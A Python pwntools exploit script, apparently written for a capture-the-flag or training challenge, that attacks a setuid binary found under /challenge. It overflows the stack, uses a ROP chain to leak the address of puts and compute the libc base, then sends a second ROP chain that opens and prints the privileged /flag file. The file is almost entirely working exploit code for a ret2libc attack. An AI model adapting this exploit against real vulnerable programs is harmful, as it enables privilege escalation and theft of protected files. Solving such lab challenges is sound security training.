import pwn

pwn.context.update(arch="amd64", os="linux", terminal=["tmux", "new-window"])


def tee[T: pwn.tube](process: T) -> T:
    import sys

    orig_recv_raw = process.recv_raw
    output = sys.__stdout__.buffer  # type: ignore sys.stdout is replaced by pwn.term

    def recv_raw(numb, *args, **kwargs):
        data = orig_recv_raw(numb, *args, **kwargs) or b""  # orig may return str('')
        output.write(data)
        output.flush()
        return data

    process.recv_raw = recv_raw
    return process


def find_challenge(search_path="/challenge"):
    from pathlib import Path
    import os
    import stat

    xs = [
        str(f.absolute())
        for f in Path(search_path).iterdir()
        if f.is_file() and os.access(f, os.X_OK) and (f.stat().st_mode & stat.S_ISUID)
    ]
    if not xs:
        raise FileNotFoundError(f"No executable found in {search_path}")
    if len(xs) > 1:
        raise FileNotFoundError(f"Multiple executables found in {search_path}")
    return xs[0]


bin = find_challenge()
elf = pwn.ELF(bin)

io = pwn.process(bin)
tee(io)
padding = 0x88

rop = pwn.ROP(elf)
rop.raw(rop.generatePadding(0, padding))
rop.call("puts", [elf.got["puts"]])
rop.call(elf.symbols["challenge"])

io.sendline(rop.chain())
io.recvuntil(b"Leaving!\n")
leak_puts_addr = pwn.u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\0"))

libc = elf.libc
assert libc
libc.address = leak_puts_addr - libc.symbols["puts"]

rop = pwn.ROP(libc)
rop.raw(rop.generatePadding(0, padding))
bss_addr = elf.bss()
rop.call(libc.symbols["read"], [0, bss_addr, 8])
rop.call(libc.symbols["open"], [bss_addr, 0])
rop.call(libc.symbols["read"], [3, bss_addr, 0x100])
rop.call(libc.symbols["write"], [1, bss_addr, 0x100])
io.sendline(rop.chain())
io.send(b"/flag\0")

io.recvrepeat()
